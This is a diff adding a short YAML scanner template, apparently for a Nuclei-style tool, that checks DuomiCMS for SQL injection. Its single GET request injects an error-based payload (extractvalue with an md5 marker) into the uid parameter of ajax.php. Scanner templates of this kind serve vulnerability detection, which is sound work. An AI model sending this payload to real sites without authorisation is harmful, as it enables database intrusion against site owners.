@@ -1,0 +1,13 @@
+id: yaml-poc-duomicms-duomicms-sql_injection-CT-158292
+info:
+  name: Yaml Poc Duomicms Duomicms Sql_Injection Ct 158292
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-duomicms-duomicms-sql_injection-CT-158292'
+  tags: sqli
+  reference: []
+http:
+- method: GET
+  path:
+  - /duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5({{r1}})))
+  redirects: false
